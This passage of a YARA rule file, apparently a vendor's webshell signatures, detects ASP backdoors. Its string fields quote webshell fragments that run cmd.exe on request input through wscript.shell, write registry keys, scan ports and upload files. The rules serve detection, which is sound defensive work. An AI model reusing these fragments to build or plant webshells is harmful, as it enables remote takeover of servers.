        $s17 = "RRS\"<option value=\"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\PortNumber\"\">3389" fullword ascii
        $s18 = "& ~ ePathrr(thshowE`End If`(thePolder.GetFect~)emObjeSystg.Filiptin(~ScrbjecteateOer.Cr Servder =heFolSet tath)`r.FilFolde= the" fullword ascii
        $s19 = "Nothet Rsose:SRs.Cling`I:SI=RRS S~~`Else `lStr)te(SqExecuConn.`SqlSt" fullword ascii
        $s20 = "InThen`ound(To Ub = 0 For itmp)` Thenp(i))ic(tmnumerIf Is `p(i))), tmip(huScan(Call `Else`, ~-~mp(i)Str(t = Inseekx)` 0 Thekx >" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _1d9b78b5b14b821139541cc0deb4cbbd994ce157_4f216890e1909148a1a8fa78af4fc913eb9645ca_788928ae87551f286d189e163e55410acbb90a64__23
{
     meta:
        description = "asp - from files 1d9b78b5b14b821139541cc0deb4cbbd994ce157.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
        hash2 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
        hash3 = "7d72ed0ef1b497619f12bc962512061d131c96cf9bcedd4a9a4345490e0a088c"
        hash4 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
     strings:
        $x1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
        $x2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
        $s3 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
        $s4 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
        $s5 = "objConn.Execute strSQL" fullword ascii
        $s6 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
        $s7 = "response.Write \"<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>\"" fullword ascii
        $s8 = "Response.Write \"<tr><td><b><font color=red>HTTPD</td><td> \" & request.servervariables(\"SERVER_SOFTWARE\") & \"</td></tr>\"" fullword ascii
        $s9 = "Response.Write \"<tr><td><b><font color=red>Port</td><td> \" & request.servervariables(\"SERVER_PORT\") & \"</td></tr>\"" fullword ascii
        $s10 = "Response.Write \"<tr><td><b><font color=red>HTTPS</td><td> \" & request.servervariables(\"HTTPS\") & \"</td></tr>\"" fullword ascii
        $s11 = "Response.Write \"<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [\"&err.Description&\"]</td></tr>\"" fullword ascii
        $s12 = "MyFile.write \"byzehir <zehirhacker@hotmail.com>\"" fullword ascii
        $s13 = "Response.Write \"<table border=1 cellpadding=0 cellspacing=0 align=center><tr><td width=100 bgcolor=gray><font size=2>SQL " fullword ascii
        $s14 = "Response.Write \"<table widht='100%' border=0 cellpadding=0 cellspacing=0><tr><td width=70><font size=2>Arama : </td><td>\"" fullword ascii
        $s15 = "re : \"&left(ss__-ss___,5)&\"sn. ;)<br><font color=blue>Hacked</font> = \"&h__&\"<br><font color=red>Failed</font> = \"&f__" fullword ascii
        $s16 = "Response.Write \"<tr><td><b><font color=red>Server</td><td> \" & request.servervariables(\"SERVER_NAME\") & \"</td></tr>\"" fullword ascii
        $s17 = "Response.Write \"<center><form action='\"&DosyPath&\"?Time=\"&time&\"' method=post>\"" fullword ascii
        $s18 = "Response.Write \"<table cellpadding=0 cellspacing=0 align=center><tr><td width=100><font size=2>Kop. Yer : </td><td>\"" fullword ascii
        $s19 = "Response.Write \"<tr><td><b><font color=red>Local Adres</td><td> \" & request.servervariables(\"REMOTE_ADDR\") & \"</td></tr>\"" fullword ascii
        $s20 = "Response.Write \"<tr><td><b>\"&drive_.DriveLetter&\":\\</td><td><font color=yellow>yazma yetkisi var!</td></tr>\"" fullword ascii
     condition:
        ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _037752fdd098a42e25c4b2c9960d18dd214aa3f6_0b3f8d5cab56018e96da7ba7ff7d73fc1905c9d9_6684959e4d40495d462b1782602eb5840b56f4de__24
{
     meta:
        description = "asp - from files 037752fdd098a42e25c4b2c9960d18dd214aa3f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7d046439732109dd70ca88b040223f9eebd55bc523d62ac85381a95176714a14"
        hash2 = "38f8cdee9744d0dd38068e41ab953083ec2c00a9afae4a99bfb8673c7f11ce41"
        hash3 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
        hash4 = "b0949198eab2be841241983d0a9a55973cacdf113928e61cb7d42dc3247dc462"
        hash5 = "91bb468add2687a86069b70f8fd419f5cb290b63c9d99da967243468f0a3dceb"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $s2 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s3 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s4 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s5 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s7 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
        $s8 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\">\"" fullword ascii
        $s9 = "tion=upload&processupload=yes&path=\" & Request.QueryString(\"path\") & \"\"\">\"" fullword ascii
        $s10 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_DWORD\")" fullword ascii
        $s11 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & strFile" fullword ascii
        $s12 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_EXPAND_SZ\")" fullword ascii
        $s13 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_SZ\")" fullword ascii
        $s14 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_MULTI_SZ\")" fullword ascii
        $s15 = "caminho = showobjpath(Replace(Trim(Request.Form(\"path\")),\"|\",\"\\\")) & \"rhtemptxt.txt\"" fullword ascii
        $s16 = "Response.Write \"<br><br><FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\" method=\"\"GET\"\">\"" fullword ascii
        $s17 = "Response.Write \"<FORM METHOD=\"\"POST\"\" ENCTYPE=\"\"multipart/form-data\"\" ACTION=\"\"\" & Request.ServerVariables(\"SCRIPT_" ascii
        $s18 = "If Request.QueryString(\"processupload\") <> \"yes\" Then" fullword ascii
        $s19 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\" method=\"\"GET\"\">\"" fullword ascii
        $s20 = "\"<form action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"\"\" method=\"\"get\"\">\" & _" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _9014671e691338e1b2f1656669e100388aa23fbb_a8dde654da009fcac59013b2f2394f1c548ba1ff_cfc4bf95c993bce745a6597473146372b4e31970_25
{
     meta:
        description = "asp - from files 9014671e691338e1b2f1656669e100388aa23fbb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
        hash2 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
        hash3 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
     strings:
        $s1 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'><b>->" fullword ascii
        $s2 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=hiddenshell' target='FileFrame'><b>->" fullword ascii
        $s3 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>->" fullword ascii
        $s4 = "</a></div></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Logout' target='_top'>->" fullword ascii
        $s5 = "RRS\"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&urL&\"\"\" target=\"\"FileFrame\"\">\":" fullword ascii
        $s6 = "</a></td></tr>\":End If::RRS\"<tr><td height='22'><a href='?Action=UpFile' target='FileFrame'>->" fullword ascii
        $s7 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>->" fullword ascii
        $s8 = ")</a></b></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>->" fullword ascii
        $s9 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'><b>->" fullword ascii
        $s10 = "</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'><b>->" fullword ascii
        $s11 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=ServerInfo' target='FileFrame'>->" fullword ascii
        $s12 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'><b>->Servu" fullword ascii
        $s13 = "</a></td></tr>\"::RRS\"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>->" fullword ascii
        $s14 = "</a></td></tr>\":RRS\"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>->" fullword ascii
        $s15 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=php' target='FileFrame'><b>->" fullword ascii
        $s16 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=plgm' target='FileFrame'></b>->" fullword ascii
        $s17 = "</b></a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cplgm&M=1' target='FileFrame'>->" fullword ascii
        $s18 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=kmuma' target='FileFrame'><b>->" fullword ascii
        $s19 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cplgm&M=2' target='FileFrame'>->" fullword ascii
        $s20 = ")</a></td></tr>\":RRS\"<tr><td height='22'><a href='?Action=Cplgm&M=3' target='FileFrame'>->" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _3a4aee002630ab97ca5f797951db25147809d5aa_e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d_26
{
     meta:
        description = "asp - from files 3a4aee002630ab97ca5f797951db25147809d5aa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0dcbd6cce79f768d9e9b79bc8c86be279779120b8232e32c1f3198ee56653518"
        hash2 = "eb1abe5d2f86693e6cebef14ab70b2664fdd5c49d6b82d5303259ac37a652180"
     strings:
        $s1 = "nda </a> - <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?kullanim');\">Kullan" fullword ascii
        $s2 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword ascii
        $s3 = "/wGUk+ hMrD+~rJLYEk[rE@#@&+UN,/;8@#@&B RO OO RRO O ORORR OR@#@&dE(P^Ck+%@#@&M+dwKUk+ SDbY+,J@!8D@*@!8D@*@!^n" fullword ascii
        $s4 = "document.write('<span id=\"typinglight\">'+message.charAt(m)+'</span>')" fullword ascii
        $s5 = "'+@*@!Vk@*ASh /m8KYCT+ Y+m:cGDTPSPShA kl\\kC3cmWs~SPShSRhkUr" fullword ascii
        $s6 = "document.write('<font face=\"'+fontface+'\" size=\"'+fontsize+'\" color=\"'+typingbasecolor+'\">')" fullword ascii
        $s7 = "y,)~hmkV8Gs4@$tKOslr^R1W:,~,4W^X[+sWU@$4WYsCk^RmKh~~,hSh /CUmVO+MGDcW.L,/kOnsk\"N" fullword ascii
        $s8 = "var tempref=document.all.typinglight" fullword ascii
        $s9 = "21212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}</style>" fullword ascii
        $s10 = "nDexEr - Reader\"" fullword ascii
        $s11 = "<td><font color=pink>Oku :</font><td><input type=\"text\" name=\"klasor\" size=25 value=<%=#@~^LQAAAA==." fullword ascii
        $s12 = "OpenWin = this.open(page, \"CtrlWindow\",\"toolbar=menubar=No,scrollbars=No,status=No,height=250,\");" fullword ascii
        $s13 = "hP~k^orVn.b@!8D@*@!0KxO~1WVG.{h4kDn,/r.+{ @*@!z1nxD+.@*@!0GUDP/b\"+{F@*@!sr@*g+MNnx_~~E.lHCPzYC^m" fullword ascii
        $s14 = "<a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?hakkinda');\">" fullword ascii
        $s15 = "x@#@&mmV^~mm/nF@#@&nsk+k6~WT+P{~EW0ErPOtnU@#@&^l^sP1ldny@#@&nsk+r0,GT+~{Prtl03bUNmJ~Y4+U@#@&ml^sP1l/" fullword ascii
        $s16 = "var message=\"SaNaLTeRoR - " fullword ascii
        $s17 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s18 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s19 = "/n SDkOn,J@!4M@*@!0GM:,lmDkKU'QPh+DtG[{wWkO@*@!kxa;OPDXa+x/;8skOP7CV!+xErb1)~UbeszErPdby" fullword ascii
        $s20 = "tempref[m].style.color=typingbasecolor" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _520caf24f9d208f62e1bb0299125e18c11ef050b_76eb780aa625e09500563c33cfa1ec25eb00feb9_27
{
     meta:
        description = "asp - from files 520caf24f9d208f62e1bb0299125e18c11ef050b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ecfae35a466824ef20ce362730b4f76e75a0f14899a4d88f7dd9d988bbc0ae18"
        hash2 = "b1eba04d89e6e990fd5d0acbf62e7451f33f53d8a2168ee401cfce54193f747d"
     strings:
        $s1 = "<font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=dongu.driveletter%>:\\ ( <%=dongu.filesystem%> )</font></td>" fullword ascii
        $s2 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></" fullword ascii
        $s3 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td>" fullword ascii
        $s4 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"duzenle\"))%></font></td" fullword ascii
        $s5 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(request.querystring(\"yenidosya\"))%></font></td>" fullword ascii
        $s6 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
        $s7 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
        $s8 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
        $s9 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
        $s10 = "set kaydoses=kaydospos.opentextfile(request.querystring(\"dosyakaydet\") & request(\"dosadi\"), 2, true)" fullword ascii
        $s11 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><%=Round(dongu.availablespace/(1024*1024),1)%> MB</font></td>" fullword ascii
        $s12 = "<font face=\"Verdana\" style=\"font-size: 8pt\"><%=Round(dongu.totalsize/(1024*1024),1)%> MB</font></td>" fullword ascii
        $s13 = "set; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center\"" fullword ascii
        $s14 = "<meta name=\"ProgId\" content=\"FrontPage.Editor.Document\">" fullword ascii
        $s15 = "<td><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<%=response.write(aktifklas)%></font></td>" fullword ascii
        $s16 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 5.0\">" fullword ascii
        $s17 = "<p align=\"center\"><b><font face=\"Verdana, Arial, Helvetica, sans-serif\" size=\"2\" color=\"#000000\" bgcolor=\"Red\"> " fullword ascii
        $s18 = "set klassis =server.createobject(\"scripting.filesystemobject\")" fullword ascii
        $s19 = "kaydoses=kaydospos.createtextfile(request.querystring(\"dosyakaydet\") & request(\"dosadi\"))" fullword ascii
        $s20 = "if aktifklas=(\"C:\") then aktifklas=(\"C:\\\")" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _9065860c36557b5843d1a433100610d2054762be_c624cd29ebe31b707b6a593299de6f5b78e661e8_28
{
     meta:
        description = "asp - from files 9065860c36557b5843d1a433100610d2054762be.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
        hash2 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
     strings:
        $x1 = "j oScriptlhn.exec(\"cmd.exe /c\"&request(\"cmd\")).stdout.readall " fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If tri" ascii
        $x3 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "end if :j oScriptlhn.exec(request(\"cmdx\")&\" /c\"&request(\"cmd\")).stdout.readall :j(\"</textarea></center>\")" fullword ascii
        $x6 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
        $s7 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s8 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s9 = "):<br/><form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & " ascii
        $s10 = ":<form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\" & HtmlEn" ascii
        $s11 = "i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39" ascii
        $s12 = "<a style=\"\"text-decoration:underline;font-weight:bold\"\" href=\"&URL&\"?ProFile=\"&pass2&\" target=_blank>" fullword ascii
        $s13 = "j(\"<center><form method='post'> \"):j(\"<input type=text name='cmdx' size=60 value='cmd.exe'><br> \"):j(\"<input type=text name" ascii
        $s14 = "t:if request(\"cmdx\")=\"cmd.exe\" then" fullword ascii
        $s15 = "If:If intValue >= 32 Then:intValue = intValue - 32:End If:If intValue >= 16 Then:intValue = intValue - 16:End If:If intValue >=" fullword ascii
        $s16 = "8 Then:intValue = intValue - 8:End If:If intValue >= 4 Then:intValue = intValue - 4:EditOK=0:End If:If intValue >= 2 Then:intVa" fullword ascii
        $s17 = "cript.shell<input name='cmd' style='width:92%' value='\"&defcmd&\"'> <input type='submit' value='" fullword ascii
        $s18 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"&chr(13)&chr" ascii
        $s19 = "j \"<option value='HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SchedulingAgent\\LogPath'>Schedule Log</option>\"" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=Logout' target='_top'>\"&cxd&\" " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _115b3ee52583fdbabeeb9814038f7bc25fb8e3bd_407d226bec41e067ad9e434e8fdfc2bb49752b7b_950123df0395b66efde64f8bd39e23f0b9389a87__29
{
     meta:
        description = "asp - from files 115b3ee52583fdbabeeb9814038f7bc25fb8e3bd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
        hash2 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
        hash3 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
        hash4 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
        hash5 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
        hash6 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
        hash7 = "3ad57c8544ad8d05128a0343399b32ce94d916e1445b455e7b6c933d5393871c"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s4 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s7 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s8 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s9 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s10 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s11 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s12 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s13 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s14 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s15 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s16 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s17 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s18 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s19 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
        $s20 = "RRS\"c:\\Program Files\\360\\360SD\\deepscan\\Section\\mutex.db <br> \"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1687747b3f79f880735ae0f762baa52b03a96c36_732bb60287fd6e3d82ab9dba919aa2a92cea20a7_7fbd58449cae52c1525e783a129e2a6159a24722__30
{
     meta:
        description = "asp - from files 1687747b3f79f880735ae0f762baa52b03a96c36.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
        hash2 = "a6f8ff3c66b27b37b827240b4c3ceb07ba851d4d2693d448aaf2710f16f7b776"
        hash3 = "3d7e1a7c12de2ddcb755a97d769df635c5a22f0ca844700129d3cdac6c65e13c"
        hash4 = "05808124f9e09365b3402b6d39ede828e316299cbd05a5ca9befa8a6f12ef814"
        hash5 = "3e2d04ccb6e5251902b4202c925e96eac23df35d0adeb5338af7a75b90efaaea"
        hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
        hash7 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
        hash8 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
        hash9 = "ef3241f0ed93797881487fbc4e4da359687f896ef526980a1425fcd51d8519cc"
        hash10 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
        hash11 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
     strings:
        $s1 = ">noitpo/<emaNretupmoC>'emaNretupmoC\\emaNretupmoC\\emaNretupmoC\\lortnoC\\teSlortnoCtnerruC\\METSYS\\MLKH'=eulav noitpo<" fullword ascii
        $s2 = "surivitna" fullword ascii /* reversed goodware string 'antivirus' */
        $s3 = "noitcennoC.BDODA" fullword ascii /* reversed goodware string 'ADODB.Connection' */
        $s4 = "nottuboidar" fullword ascii /* reversed goodware string 'radiobutton' */
        $s5 = "gnisir" fullword ascii /* reversed goodware string 'rising' */
        $s6 = "tacmot" fullword ascii /* reversed goodware string 'tomcat' */
        $s7 = "\\eciveD\\" fullword ascii /* reversed goodware string '\\Device\\' */
        $s8 = ")egamI tnetnoCelif ,rahCraV htaPeht ,DERETSULC YEK YRAMIRP )1,0(YTITNEDI tni dI(ataDeliF elbaT etaerC" fullword ascii
        $s9 = ">rb<>tnof/<" fullword ascii /* reversed goodware string '</font><br>' */
        $s10 = "rebmuNtroP\\pcT-PDR\\snoitatSniW\\revreS lanimreT\\lortnoC\\teSlortnoCtnerruC\\METSYS\\MLKH" fullword ascii
        $s11 = ">mrof/<>p/<" fullword ascii /* reversed goodware string '</p></form>' */
        $s12 = "rotartsinimdA" fullword ascii /* reversed goodware string 'Administrator' */
        $s13 = ",noitpircsed.rrE(rtSnI fI" fullword ascii
        $s14 = "sretliFytiruceSelbanE\\sretemaraP\\pipcT\\secivreS\\teSlortnoCtnerruc\\METSYS\\MLKH" fullword ascii
        $s15 = "emaNretupmoC\\emaNretupmoC\\emaNretupmoC\\lortnoC\\teSlortnoCtnerruC\\METSYS\\MLKH" fullword ascii
        $s16 = ">vid/<!" fullword ascii /* reversed goodware string '!</div>' */
        $s17 = "ataDeliF" fullword ascii /* reversed goodware string 'FileData' */
        $s18 = "ehcapa" fullword ascii /* reversed goodware string 'apache' */
        $s19 = "ecivreS" fullword ascii /* reversed goodware string 'Service' */
        $s20 = "elcaro" fullword ascii /* reversed goodware string 'oracle' */
     condition:
        ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _1d6fc42a9221e87214b5a316ac2bc76cf49f4fd6_27b75e17a69fc3fa2f07d8f5ee9258fc92af4030_e9301a8269d87868e33651f0b8c6f7f08e902383_31
{
     meta:
        description = "asp - from files 1d6fc42a9221e87214b5a316ac2bc76cf49f4fd6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
